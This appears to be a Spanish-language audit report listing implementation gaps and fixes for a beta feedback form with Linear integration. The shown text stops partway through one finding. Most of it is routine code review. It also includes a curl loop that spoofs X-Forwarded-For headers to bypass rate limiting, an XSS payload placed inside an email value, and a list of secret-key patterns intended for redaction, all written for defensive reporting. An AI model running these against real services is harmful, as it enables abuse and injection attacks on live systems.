# SPEC-031: Beta Feedback Form - Gap Analysis Report

**Spec:** SPEC-031 - Beta Feedback Form with Linear Integration
**Date:** 2026-03-09
**Auditors:**
- Audit #1: Tech Lead + Frontend Expert + Backend Expert + QA Expert
- Audit #2: Code Reviewer Senior + Security Auditor + Schema Expert + Integration Expert + Env Vars Expert
- Audit #3: Tech Lead Senior + Backend Expert + Security Auditor + Integration Expert (exploracion exhaustiva con 4 agentes paralelos)
- Audit #4: Code Reviewer Senior + Security Auditor + Test Auditor + 3 Explorers paralelos (6 agentes, lectura exhaustiva de 21+ archivos core, analisis de 27+ test files, auditoria de seguridad dedicada)
- Audit #5: 4 Code Reviewers paralelos (API backend, frontend components, hooks/config/schemas, app integrations + notifications). Analisis exhaustivo linea por linea de 30+ archivos.
- Audit #6: 3 Code Reviewers Senior especializados paralelos (feedback package completo, API routes+services, web/admin integration+tests) + 1 Explorer exhaustivo. Auditoria de contraste spec vs codigo con foco en gaps no detectados en auditorias previas. 40+ archivos revisados linea por linea.
- Audit #7: Tech Lead Senior lectura directa de todo el codigo fuente (30+ archivos source code leidos completos, 6 integraciones verificadas, contraste linea por linea contra spec). Foco en gaps funcionales/arquitecturales no capturados en auditorias 1-6.
**Audit Passes:** 7

---

## Executive Summary

SPEC-031 tiene **38/46 tasks completadas** (82.6%). Las 8 tasks pendientes (T-039 a T-046) corresponden a la **Testing Phase** y al **Cleanup Phase**. El paquete `packages/feedback/`, el endpoint API, las extensiones a `@repo/notifications`, y la integracion en ambas apps (web + admin) estan implementados.

La auditoria exhaustiva (7 pasadas) revela **102 gaps** entre la spec y la implementacion real:
- **Audit #1**: 15 gaps iniciales
- **Audit #2**: 15 gaps nuevos (incluyendo 4 criticos de seguridad/correctness)
- **Audit #3**: 6 gaps nuevos (incluyendo 1 CRITICO de correctness y 1 ALTO de funcionalidad)
- **Audit #4**: 11 gaps nuevos (incluyendo 1 CRITICO de React Rules of Hooks, 1 ALTO de seguridad por Markdown injection en Linear)
- **Audit #5**: 31 gaps nuevos (incluyendo 2 CRITICOS de DoS/SSRF, 9 ALTOS de seguridad/correctness/funcionalidad, 12 MEDIOS, 8 BAJOS)
- **Audit #6**: 12 gaps nuevos (incluyendo 1 ALTO de accesibilidad WCAG, 2 ALTOS de seguridad/resiliencia, 5 MEDIOS, 4 BAJOS)
- **Audit #7**: 12 gaps nuevos (incluyendo 2 CRITICOS de spec-compliance/correctness, 3 ALTOS de funcionalidad/seguridad, 4 MEDIOS, 3 BAJOS)

Las extensiones a `@repo/notifications` (T-007 a T-012) estan **100% implementadas** con 34 tests de integracion.

**Audit #7 - Hallazgos mas graves:**
1. **GAP-031-91**: Email fallback envia al `reporterEmail` (usuario que reporto) en vez de al equipo (`FEEDBACK_CONFIG.fallbackEmail`). Confirma y refuerza GAP-031-31 que sigue sin resolverse.
2. **GAP-031-92**: Web FAB (`BaseLayout.astro`) NO recibe `userId`, `userEmail`, `userName` de la sesion.. formulario siempre muestra campos de contacto como obligatorios aun para usuarios logueados (US-01/US-06 violation)
3. **GAP-031-93**: Admin `feedbackPageUrl="/es/feedback"` es relativa al dominio del admin (`localhost:3000/es/feedback`), no al web (`localhost:4321/es/feedback`).. fallback de error boundary abre pagina inexistente
4. **GAP-031-96**: `HOSPEDA_FEEDBACK_ENABLED` y `HOSPEDA_FEEDBACK_FALLBACK_EMAIL` env vars declaradas en spec seccion 8 no existen en `apps/api/src/utils/env.ts`.. kill switch y email configurable son no funcionales

**Audit #6 - Hallazgos mas graves:**
1. **GAP-031-79**: `outline: 'none'` en todos los inputs/textareas/FAB elimina indicador de foco (WCAG 2.1 AA failure)
2. **GAP-031-85**: FeedbackFAB en admin NO esta dentro de ningun error boundary.. si crashea, se pierde la capacidad de reportar errores
3. **GAP-031-86**: `initializationFailed` en notification-helper.ts silencia PERMANENTEMENTE todas las notificaciones futuras si la primera inicializacion falla
4. **GAP-031-87**: `apiUrl` prop en `useFeedbackSubmit` acepta string arbitrario sin validacion de origen (exfiltracion de datos)

**Audit #5 - Hallazgos mas graves:**
1. **GAP-031-48**: SSRF potencial.. el servidor hace PUT a una URL de presigned URL sin validar que sea un host S3 legitimo
2. **GAP-031-49**: No hay limite de tamano de body antes de parsear `formData()`.. un request de 500MB se buferea completo en memoria
3. **GAP-031-50**: Todos los buffers de archivos (5x10MB=50MB) se mantienen en memoria simultaneamente durante toda la duracion del request (incluyendo retries)
4. **GAP-031-57**: Admin `feedbackPageUrl` es URL relativa que apunta al dominio del admin, no al web.. el fallback de error boundary abre una pagina inexistente
5. **GAP-031-60**: `useFeedbackSubmit` no usa `AbortController`.. setState en componente desmontado
6. **GAP-031-65**: Export `./schemas/server` en package.json apunta a archivo inexistente

---

## Task Status Overview

| Phase | Total | Completed | Pending |
|-------|-------|-----------|---------|
| Setup | 12 | 12 | 0 |
| Core | 19 | 19 | 0 |
| Integration | 7 | 7 | 0 |
| Testing | 7 | 0 | 7 |
| Cleanup | 1 | 0 | 1 |
| **Total** | **46** | **38** | **8** |

### Tasks Pendientes (declaradas en la spec)

| Task | Descripcion | Complejidad |
|------|-------------|-------------|
| T-039 | Responsive testing: modal desktop, drawer mobile | 3 |
| T-040 | Accessibility audit: keyboard nav, focus, screen reader | 4 |
| T-041 | FAB minimize/restore testing + localStorage | 2 |
| T-042 | Rate limiting E2E verification | 2 |
| T-043 | Linear integration E2E test con mock server | 4 |
| T-044 | Error boundary E2E test: crash -> form pre-filled | 3 |
| T-045 | Keyboard shortcut E2E test | 2 |
| T-046 | Update Linear config con IDs reales (manual) | 2 |

---

## Gaps Encontrados

---

### GAP-031-01: Archivos exceden limite de 500 lineas [Audit #1]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 3
**Categoria:** Code quality / Violacion de estandar

**Descripcion:**
Cinco archivos del sistema exceden el limite de 500 lineas por archivo establecido en CLAUDE.md:

| Archivo | Lineas | Exceso |
|---------|--------|--------|
| `src/components/steps/StepDetails.tsx` | 620 | +120 |
| `src/components/FeedbackForm.tsx` | 591 | +91 |
| `src/components/FeedbackFAB.tsx` | 541 | +41 |
| `apps/api/src/services/feedback/linear.service.ts` | 512 | +12 |
| `apps/api/src/middlewares/sanitization.ts` | 503 | +3 |

**Solucion propuesta:**
1. `StepDetails.tsx`: Extraer la logica de file upload (drag-drop, validacion, preview) a un componente `FileUploadArea.tsx`. Extraer la seccion de tech details a `TechDetailsCollapsible.tsx`.
2. `FeedbackForm.tsx`: Extraer los objetos de estilos a un archivo `styles.ts`. Extraer la logica de validacion a un hook `useFormValidation.ts`.
3. `FeedbackFAB.tsx`: Extraer `BugIcon` y `MinimizeIcon` SVGs a archivos separados o usar `@repo/icons`. Extraer `injectPulseStyles` a utility.
4. `linear.service.ts`: Extraer `buildIssueDescription()` a un archivo `issue-formatter.ts`.

**Recomendacion:** Solucionar directo como parte de un PR de refactor dedicado. No requiere spec nueva.

**Decision:** ✅ HACER. Refactor de extracción para cumplir estándar de 500 líneas. (2026-03-09)

---

### GAP-031-02: No se usa Shadcn UI como indica la spec [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 4
**Categoria:** Desviacion de spec / UI consistency

**Descripcion:**
La spec (seccion 11, Dependencies) dice: *"Form inputs use shadcn components (Input, Textarea, Select, Button, Dialog/Drawer) from the admin panel's existing shadcn setup."*

La implementacion usa **HTML puro** con estilos inline:
- `<input>` en lugar de `<Input>` de shadcn
- `<textarea>` en lugar de `<Textarea>` de shadcn
- `<select>` en lugar de `<Select>` de shadcn
- `<button>` en lugar de `<Button>` de shadcn
- Modal custom en lugar de `<Dialog>` / `<Drawer>` de shadcn

**Justificacion de la implementacion actual:**
El paquete fue disenado como **self-contained** sin dependencias externas de UI, lo cual tiene ventajas:
- Funciona en web (Astro) y admin (TanStack Start) sin configuracion adicional
- La pagina standalone de feedback no necesita cargar shadcn
- Mayor resiliencia: si shadcn falla, el feedback sigue funcionando

**Recomendacion:** Documentar como decision de arquitectura (ADR). No cambiar.. la implementacion es razonablemente justificada para un sistema de crash reporting.

**Decision:** ✅ HACER. Migrar a Shadcn UI según spec original. (2026-03-09)

---

### GAP-031-03: Iconos inline en lugar de @repo/icons [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Desviacion de spec / Consistencia

**Descripcion:**
La spec dice: *"Icon: Bug/message icon (from @repo/icons)"* y *"Icons: From @repo/icons"*. La implementacion usa SVGs inline (`BugIcon()`, `MinimizeIcon()` en `FeedbackFAB.tsx`).

**Justificacion:** Misma razon que GAP-031-02.. mantener el paquete self-contained.

**Recomendacion:** Documentar junto con GAP-031-02. No cambiar.

**Decision:** ✅ HACER. Migrar iconos a @repo/icons (junto con GAP-031-02). (2026-03-09)

---

### GAP-031-04: Console error capture no se inicializa al arranque de app [Audit #1]

**Severidad:** MEDIA
**Prioridad:** ALTA
**Complejidad:** 3
**Categoria:** Funcionalidad incompleta

**Descripcion:**
La spec (seccion 4.5) dice: *"On app initialization, a lightweight interceptor wraps console.error"* y *"Buffer is read by useAutoCollect when the form opens"*.

La implementacion actual:
- `useConsoleCapture()` se inicializa **solo dentro de `useAutoCollect()`**
- `useAutoCollect()` se monta **solo cuando el formulario se abre**
- Los errores de consola que ocurren **antes de que el usuario abra el FAB se pierden**

**Impacto:** Si un error JS ocurre en la pagina y el usuario abre el feedback 5 minutos despues, el buffer de errores estara vacio.

**Solucion propuesta:**
1. Crear un script ligero de inicializacion (`initConsoleCapture.ts`) que se ejecute al arranque
2. Almacenar el buffer en un singleton global (e.g., `window.__feedbackConsoleBuffer`)
3. `useAutoCollect` lee de ese buffer global
4. En web: cargar via `<script>` tag en BaseLayout (antes de React hydration)
5. En admin: llamar en el root layout antes de los providers

**Recomendacion:** Solucionar directo. Es un bug funcional que reduce la utilidad del sistema.

**Decision:** ✅ HACER. Implementar captura global al arranque con singleton window.__feedbackConsoleBuffer. (2026-03-09)

---

### GAP-031-05: FeedbackIslandWrapper existe pero no se usa en ninguna isla [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Dead code / Integracion incompleta

**Descripcion:**
La spec (seccion 4.2, US-04) requiere: *"FeedbackErrorBoundary wraps React islands"* en web. Se creo `apps/web/src/components/feedback/FeedbackIslandWrapper.tsx` pero **no se importa ni usa en ningun componente Astro**. Es dead code.

El admin SI integra `FeedbackErrorBoundary` correctamente en el root layout (`__root.tsx`).

**Recomendacion:** Evaluar que islas React en web justifican el wrapper. Si ninguna, eliminar dead code.

**Decision:** ✅ HACER. Evaluar islas React en web; si ninguna lo necesita, eliminar dead code. (2026-03-09)

---

### GAP-031-06: deployVersion nunca se pasa a los componentes de feedback [Audit #1]

**Severidad:** BAJA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Funcionalidad incompleta / Metadata faltante

**Descripcion:**
La spec (seccion 3.5) lista `deployVersion` como dato auto-recolectado. Ni web ni admin pasan `deployVersion` al `FeedbackFAB`. Todos los reportes llegan a Linear sin informacion de version.

**Solucion propuesta:**
1. Definir `HOSPEDA_DEPLOY_VERSION` / `VITE_DEPLOY_VERSION`
2. Configurar en CI/CD: `HOSPEDA_DEPLOY_VERSION=$VERCEL_GIT_COMMIT_SHA`
3. Pasar al FAB: `deployVersion={import.meta.env.HOSPEDA_DEPLOY_VERSION}`

**Recomendacion:** Solucionar directo. Trivial y mejora significativamente la utilidad de reportes.

**Decision:** ✅ HACER. Configurar env var HOSPEDA_DEPLOY_VERSION y pasar al FAB en ambas apps. (2026-03-09)

---

### GAP-031-07: Env vars no registradas ni funcionales [Audit #1, actualizado Audit #2]

**Severidad:** MEDIA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Configuracion incompleta

**Descripcion:**
Tres problemas relacionados con variables de entorno:

1. `HOSPEDA_FEEDBACK_FALLBACK_EMAIL` y `HOSPEDA_FEEDBACK_ENABLED` **no estan en `env-registry.hospeda.ts`** (Audit #1)
2. **[Audit #2]** `HOSPEDA_FEEDBACK_FALLBACK_EMAIL` no esta en `ApiEnvSchema` (apps/api/src/utils/env.ts). El codigo usa un valor **hardcodeado** en `FEEDBACK_CONFIG.fallbackEmail` (`'feedback@hospeda.com'`) en lugar de leer la env var
3. **[Audit #2]** `HOSPEDA_FEEDBACK_ENABLED` no esta en `ApiEnvSchema` y `FEEDBACK_CONFIG.enabled` esta **hardcodeado a `true`**. La variable de entorno existe en el schema Zod de config pero **nunca se lee**. El feature flag es completamente non-functional

**Impacto:**
- `pnpm env:check` no valida estas variables
- No se puede cambiar el email de fallback sin un deploy de codigo
- **No se puede desactivar el feedback system en produccion via env var**.. requiere deploy

**Solucion propuesta:**
1. Registrar ambas en `env-registry.hospeda.ts`
2. Agregar `HOSPEDA_FEEDBACK_FALLBACK_EMAIL` y `HOSPEDA_FEEDBACK_ENABLED` a `ApiEnvSchema`
3. En la ruta de feedback: leer `env.HOSPEDA_FEEDBACK_ENABLED` y retornar 404 si es `false`
4. Usar `env.HOSPEDA_FEEDBACK_FALLBACK_EMAIL` en vez del valor hardcodeado en config

**Recomendacion:** Solucionar directo. Es un fix importante para operabilidad en produccion.

**Decision:** ✅ HACER. Registrar env vars, conectar kill switch server-side y email configurable. (2026-03-09)

---

### GAP-031-08: Estilos inline duplicados sin centralizacion [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Code quality / DRY

**Descripcion:**
Los mismos colores y estilos se repiten hardcodeados en multiples componentes:
- `#2563eb` (azul primario), `#111827` (gris texto), `#e5e7eb` (borde), `#fef2f2`/`#fecaca` (error)

**Solucion propuesta:**
Crear `packages/feedback/src/config/theme.ts` con constantes centralizadas.

**Recomendacion:** Solucionar junto con GAP-031-01 en PR de refactor.

**Decision:** ✅ HACER. Se resuelve junto con migración a Shadcn (GAP-031-02). (2026-03-09)

---

### GAP-031-09: Sin virus/malware scanning de archivos adjuntos [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 4
**Categoria:** Seguridad / Non-goal parcial

**Descripcion:**
La spec menciona *"virus scanning if available"* pero no hay integracion con ClamAV/VirusTotal.

**Recomendacion:** Postergar para post-beta. Riesgo bajo: solo imagenes, van a Linear, hay rate limiting, testers de confianza.

**Decision:** ⏸️ POSTERGAR. Riesgo bajo para beta con testers de confianza. Evaluar post-beta. (2026-03-09)

---

### GAP-031-10: TODOs.md desactualizado - muestra 0/46 cuando hay 38/46 [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** Documentacion desactualizada

**Descripcion:**
`.claude/tasks/SPEC-031-beta-feedback-form/TODOs.md` muestra `0/46 tasks (0%)` cuando `state.json` tiene 38/46 completadas.

**Recomendacion:** Regenerar con `/task-master:task-status SPEC-031`.

**Decision:** ✅ HACER. Regenerar archivo de progreso. (2026-03-09)

---

### GAP-031-11: Pagina 404 no linkea a feedback [Audit #1]

**Severidad:** MUY BAJA
**Prioridad:** MUY BAJA
**Complejidad:** 1
**Categoria:** Feature gap menor

**Descripcion:**
La pagina `500.astro` SI tiene un boton "Reportar este error" pero `404.astro` no tiene link a feedback. Un 404 raramente es un bug, pero podria haber links rotos que los beta testers quieran reportar.

**Recomendacion:** Postergar. Nice-to-have menor.

**Decision:** ✅ HACER. Agregar link a feedback en 404.astro. (2026-03-09)

---

### GAP-031-12: Todos los Linear IDs son placeholders [Audit #1]

**Severidad:** CRITICA (blocker para produccion)
**Prioridad:** CRITICA
**Complejidad:** 1 (configuracion manual)
**Categoria:** Configuracion incompleta

**Descripcion:**
**13 valores PLACEHOLDER** en `feedback.config.ts`: 6 `linearLabelId` en REPORT_TYPES, `teamId`, `projectId`, `defaultStateId`, 3 `labels.source.*`, 1 `labels.environment.beta`.

El codigo filtra labels PLACEHOLDER_ (no los envia), pero los issues no tendran labels ni proyecto correcto.

**Recomendacion:** BLOCKER. Debe hacerse antes de uso real. Es la task T-046.

**Decision:** ✅ HACER. Configurar IDs reales de Linear al final de la spec, de forma manual/colaborativa. (2026-03-09)

---

### GAP-031-13: Falta .env.example con variables de feedback [Audit #1]

**Severidad:** BAJA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** DX / Onboarding

**Descripcion:**
Las variables de feedback no aparecen en `.env.example` de `apps/api/`.

**Recomendacion:** Solucionar junto con GAP-031-07. Trivial.

**Decision:** ✅ HACER. Agregar variables de feedback a .env.example (junto con GAP-031-07). (2026-03-09)

---

### GAP-031-14: Rate limit error message en ingles en lugar de espanol [Audit #1]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 1
**Categoria:** i18n / Consistencia

**Descripcion:**
El middleware de rate limiting retorna un mensaje en ingles. El frontend tiene el string en espanol, pero si el 429 se muestra directamente, sera en ingles.

**Recomendacion:** Verificar que `useFeedbackSubmit.ts` mapea 429 al string espanol. Si ya lo hace, cerrar. Si no, fix trivial.

**Decision:** ✅ HACER. Se resuelve junto con GAP-031-73 (manejo de 429 en cliente). (2026-03-09)

---

### GAP-031-15: Schema Zod duplicado entre @repo/feedback y apps/api [Audit #1, actualizado Audit #2]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 3
**Categoria:** Violacion de Single Source of Truth / DRY / Riesgo de divergencia

**Descripcion:**
El endpoint `submit.ts` (lineas 31-91) redefine todos los schemas localmente en lugar de importar de `@repo/feedback/schemas/server`.

**[Audit #2 - Root cause identificado]:**
- `@repo/feedback` usa **Zod v3.23.8** (`packages/feedback/package.json`)
- El API usa **Zod v4.0.8** (root `package.json`, via `@hono/zod-openapi`)
- Este mismatch de version es la razon tecnica de la duplicacion
- Los enums `REPORT_TYPES_ENUM`, `SEVERITY_ENUM`, `APP_SOURCE_ENUM` y `environmentSchema` son copias literales
- **Riesgo concreto:** Si alguien cambia `max(5000)` a `max(8000)` para description en `@repo/feedback`, el servidor seguira rechazando con el limite viejo silenciosamente

**Solucion propuesta:**
1. **Opcion A (ideal):** Migrar `@repo/feedback` a Zod v4 y eliminar duplicacion
2. **Opcion B:** Mantener duplicacion + agregar test automatizado que compare ambos schemas field-por-field
3. **Opcion C:** Exportar constantes (arrays de enum values, limits) como JSON plano desde `@repo/feedback` y usarlas en ambos schemas Zod

**Recomendacion:** Opcion A si el esfuerzo de migracion es bajo. Opcion C como alternativa pragmatica. Puede hacerse sin spec nueva pero con PR dedicado.

**Decision:** ✅ HACER Opción A. Migrar @repo/feedback a Zod v4 y eliminar duplicación. (2026-03-09)

---

### GAP-031-16: setState durante render causa infinite loop potencial [Audit #2]

**Severidad:** CRITICA
**Prioridad:** CRITICA
**Complejidad:** 1
**Categoria:** Bug / Correctness

**Descripcion:**
En `packages/feedback/src/components/FeedbackForm.tsx:438-440`:

```typescript
if (isSuccess && step !== 'success') {
    setStep('success');
}
```

Llamar `setState` directamente en el cuerpo del render (fuera de un event handler o `useEffect`) viola las reglas de React. En Concurrent Mode, React puede renderizar multiples veces antes de commit, disparando `setStep` en cada pasada, causando un bucle infinito.

**Solucion propuesta:**
```typescript
useEffect(() => {
    if (submitState.result !== null && step !== 'success') {
        setStep('success');
    }
}, [submitState.result, step]);
```

**Recomendacion:** Solucionar directo **inmediatamente**. Es un bug critico que puede causar crash en produccion con React 18+ Concurrent Mode.

**Decision:** ✅ HACER. Mover setState a useEffect. (2026-03-09)

---

### GAP-031-17: appSource cast inseguro en linear.service.ts [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Seguridad / Type safety

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:504`:

```typescript
const appSourceKey = input.appSource as keyof typeof sourceLabels;
const sourceLabelId = sourceLabels[appSourceKey];
```

`input.appSource` es `string` en `CreateFeedbackIssueInput`. El cast `as keyof typeof sourceLabels` es inseguro.. si el valor no es `'web' | 'admin' | 'standalone'`, TypeScript no lo detecta en runtime y `sourceLabels[appSourceKey]` devuelve `undefined`. Un valor controlado por el usuario se usa como key de objeto.

**Solucion propuesta:**
Tipar `appSource` en `CreateFeedbackIssueInput` como `'web' | 'admin' | 'standalone'` (importando `AppSourceId`) o agregar guard:
```typescript
const validSources = ['web', 'admin', 'standalone'] as const;
if (!validSources.includes(input.appSource as any)) {
    this.logger.warn({ appSource: input.appSource }, 'Invalid appSource');
}
```

**Recomendacion:** Solucionar directo. Fix trivial de type safety.

**Decision:** ✅ HACER. Tipar appSource correctamente y agregar guard. (2026-03-09)

---

### GAP-031-18: reporterEmail no sanitizado en el servidor [Audit #2]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
**Categoria:** Seguridad / XSS

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:248-261`, el bloque de sanitizacion aplica `sanitizeString()` a 6 campos de texto pero **omite `reporterEmail`**. Un email como `"a@b.com<script>alert(1)</script>"` pasa la validacion Zod (truncado, es un email valido por formato) y llega sin sanitizar al body del issue de Linear y al email de fallback.

**Solucion propuesta:**
Agregar `reporterEmail: sanitizeEmail(parsed.reporterEmail)` al bloque de sanitizacion. La funcion `sanitizeEmail` ya existe en `sanitization.ts`.

**Recomendacion:** Solucionar directo **inmediatamente**. Fix de una linea.

**Decision:** ✅ HACER. Agregar sanitizeEmail(reporterEmail). (2026-03-09)

---

### GAP-031-19: Feature flag FEEDBACK_ENABLED completamente non-functional [Audit #2]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Operabilidad / Feature flag roto

**Descripcion:**
`HOSPEDA_FEEDBACK_ENABLED` existe como schema Zod en `packages/config/src/sections/feedback.schema.ts` pero:
1. No esta en `ApiEnvSchema` (apps/api/src/utils/env.ts)
2. `FEEDBACK_CONFIG.enabled` esta **hardcodeado a `true`** en `packages/feedback/src/config/feedback.config.ts:165`
3. **Cero referencias** a `HOSPEDA_FEEDBACK_ENABLED` en todo el codebase (grep confirma)
4. No hay ningun check de `enabled` en la ruta API ni en los componentes frontend

**Impacto:** No se puede desactivar el sistema de feedback sin un deploy de codigo. En caso de abuso o problema en produccion, no hay kill switch.

**Solucion propuesta:**
1. Agregar `HOSPEDA_FEEDBACK_ENABLED` a `ApiEnvSchema` con default `true`
2. En la ruta `submit.ts`, verificar `env.HOSPEDA_FEEDBACK_ENABLED` al inicio y retornar 404/503 si `false`
3. (Opcional) Propagar al frontend ocultando el FAB via feature flag

**Recomendacion:** Solucionar directo. Es critico para operabilidad en produccion. No requiere spec.

---

### GAP-031-20: Stack trace completo expuesto via query params y Linear [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Seguridad / Information disclosure

**Descripcion:**
En `packages/feedback/src/components/FeedbackErrorBoundary.tsx:189-198`, cuando el modal falla y se abre una nueva pestana:

```typescript
const qs = serializeFeedbackParams({
    stack: error.stack,  // stack trace COMPLETO en URL
    ...
});
window.open(`${feedbackPageUrl}${separator}${qs}`, '_blank');
```

Stack traces pueden contener:
- Paths internos del servidor (si SSR)
- Nombres de archivos fuente
- Detalles de arquitectura interna

El stack queda en: historial del navegador, logs del servidor, barra de direcciones.

Ademas, en `linear.service.ts:450-453`, el stack trace completo se incluye en el body del issue de Linear.

**Solucion propuesta:**
1. Truncar stack a primeras 5 lineas antes de serializar en query params
2. En Linear: redactar paths sensibles (home dirs, server internals) antes de crear issue

**Recomendacion:** Solucionar directo. Reducir exposicion de info interna.

**Decision:** ✅ HACER. Truncar stack a 5 líneas en query params y redactar paths sensibles en Linear. (2026-03-09)

---

### GAP-031-21: Validacion MIME solo client-supplied (sin magic bytes) [Audit #2]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 2
**Categoria:** Seguridad / File upload

**Descripcion:**
En `apps/api/src/routes/feedback/submit.ts:273`:

```typescript
if (!ALLOWED_FILE_TYPES.includes(entry.type as ...)) {
    return ctx.json({ ... }, 400);
}
```

`File.type` es **suministrado por el navegador** y no se verifica server-side. Un atacante puede:
1. Crear un archivo ejecutable malicioso
2. Enviarlo con `Content-Type: image/png`
3. El servidor lo acepta como imagen valida
4. Se sube a Linear con extension/tipo falso

**Solucion propuesta:**
Validar magic bytes (file signature) de los primeros N bytes del buffer:
- PNG: `\x89PNG\r\n\x1a\n`
- JPEG: `\xFF\xD8\xFF`
- WebP: `RIFF....WEBP`
- GIF: `GIF87a` o `GIF89a`

Usar una libreria como `file-type` o validar manualmente los primeros 8 bytes.

**Recomendacion:** Solucionar directo. Fix de seguridad importante. No requiere spec.

**Decision:** ✅ HACER. Validar magic bytes server-side para PNG/JPEG/WebP/GIF. (2026-03-09)

---

### GAP-031-22: Rate limit bypass via X-Forwarded-For spoofing [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 2
**Categoria:** Seguridad / Rate limiting

**Descripcion:**
En `apps/api/src/middlewares/rate-limit.ts:363-395`:
- Cuando `trustProxy=true`, el rate limit usa el IP de `X-Forwarded-For` header
- **No hay validacion** de que el header viene de un proxy confiable (Vercel/Cloudflare)
- Un atacante puede rotar IPs falsos en el header para bypass ilimitado del rate limit:
  ```bash
  for i in {1..100}; do
    curl -H "X-Forwarded-For: $RANDOM.$RANDOM.$RANDOM.$RANDOM" ...
  done
  ```
- Cuando `trustProxy=false` (default actual), **todos** los requests comparten UN solo bucket (`'untrusted-proxy'`), lo que significa que 30 requests/hora es el limite global compartido entre todos los usuarios

**Nota mitigante:** En produccion (Vercel), el reverse proxy inyecta X-Forwarded-For de forma segura. Pero en otros entornos de deploy esto seria vulnerable.

**Solucion propuesta:**
1. Documentar que `trustProxy=true` solo debe activarse detras de Vercel/Cloudflare
2. Cuando `trustProxy=false`, usar el IP real del socket en vez de un bucket compartido
3. (Opcional) Validar que X-Forwarded-For viene de IPs de proxy conocidos

**Recomendacion:** Evaluar el impacto real segun el entorno de deploy. Para beta (Vercel), el riesgo es bajo. Documentar como deuda tecnica.

**Decision:** ✅ HACER. Fix del bucket compartido cuando trustProxy=false + documentación. (2026-03-09)

---

### GAP-031-23: setTimeout leak en intervalo de pulso del FAB [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 1
**Categoria:** Bug / Memory leak

**Descripcion:**
En `packages/feedback/src/components/FeedbackFAB.tsx:373-379`:

```typescript
const interval = setInterval(() => {
    setIsPulsing(true);
    const timeout = setTimeout(() => setIsPulsing(false), PULSE_DURATION_MS);
    return () => clearTimeout(timeout);  // BUG: return en callback de setInterval es IGNORADO
}, PULSE_INTERVAL_MS);
```

`setInterval` **ignora** el valor de retorno de su callback. Cada tick de 30 segundos crea un nuevo `setTimeout` sin limpieza. Si el componente se desmonta, el cleanup del `useEffect` limpia el `interval` pero deja N `setTimeout`s huerfanos intentando llamar `setIsPulsing` en un componente desmontado.

**Solucion propuesta:**
```typescript
let timeoutId: ReturnType<typeof setTimeout> | undefined;
const interval = setInterval(() => {
    setIsPulsing(true);
    timeoutId = setTimeout(() => setIsPulsing(false), PULSE_DURATION_MS);
}, PULSE_INTERVAL_MS);
return () => {
    clearInterval(interval);
    if (timeoutId) clearTimeout(timeoutId);
};
```

**Recomendacion:** Solucionar directo. Fix trivial de bug real.

**Decision:** ✅ HACER. Fix del setTimeout leak en pulse interval. (2026-03-09)

---

### GAP-031-24: Console errors pueden filtrar datos sensibles a Linear [Audit #2]

**Severidad:** MEDIA
**Prioridad:** MEDIA
**Complejidad:** 3
**Categoria:** Seguridad / Data leakage

**Descripcion:**
En `apps/api/src/services/feedback/linear.service.ts:445-447`, los errores de consola capturados se incluyen textualmente en el issue de Linear:

```typescript
if (env.consoleErrors && env.consoleErrors.length > 0) {
    sections.push(`## Errores de consola\n\`\`\`\n${env.consoleErrors.join('\n')}\n\`\`\``);
}
```

Los errores de consola pueden contener:
- API keys/tokens logueados accidentalmente
- Queries SQL si el error es de base de datos
- Datos personales (IDs, emails, direcciones del contexto del error)
- Detalles internos del sistema (server names, file paths)

Estos quedan como registro permanente en Linear, visible para todo el equipo.

**Solucion propuesta:**
1. Filtrar patterns de API keys (regex: `sk_live_`, `pk_`, `Bearer `, `api_key=`, etc.)
2. Truncar cada error de consola a max 500 chars
3. Redactar paths de servidor (reemplazar `/home/*/` con `[redacted]`)
4. Agregar un banner en el issue indicando que los errores de consola pueden contener info sensible

**Recomendacion:** Solucionar directo. Fix de seguridad moderado. No requiere spec.

**Decision:** ✅ HACER. Filtrar API keys, truncar a 500 chars, redactar paths sensibles. (2026-03-09)

---

### GAP-031-25: useConsoleCapture buffer mutation no thread-safe [Audit #2]

**Severidad:** BAJA
**Prioridad:** BAJA
**Complejidad:** 2
**Categoria:** Bug potencial / Race condition

**Descripcion:**
En `packages/feedback/src/hooks/useConsoleCapture.ts:60-64`:

```typescript
const buffer = bufferRef.current;
if (buffer.length >= MAX_BUFFER_SIZE) {
    buffer.shift();  // mutacion directa del array
}
buffer.push(entry);
```

El array `bufferRef.current` se muta en-place desde el closure de `console.error`, que puede ejecutarse asincronamente mientras `getErrors()` esta leyendo el array. En React StrictMode los efectos se ejecutan dos veces, lo que puede resultar en dos interceptores operando sobre el mismo buffer.

Ademas, si el hook se monta en dos componentes simultaneamente, el segundo intercepta el primero, pero al desmontarse el primero restaura la version original saltando el segundo interceptor.

**Solucion propuesta:**
Usar asignacion inmutable: `bufferRef.current = [...bufferRef.current.slice(-MAX_BUFFER_SIZE + 1), entry]`.

**Recomendacion:** Solucionar directo. Bajo riesgo en practica pero fix sencillo.

**Decision:** ✅ HACER. Cambiar a asignación inmutable del buffer. (2026-03-09)

---

### GAP-031-26: Attachments procesados antes de validar conteo (DoS vector) [Audit #2]

**Severidad:** ALTA
**Prioridad:** ALTA
**Complejidad:** 1
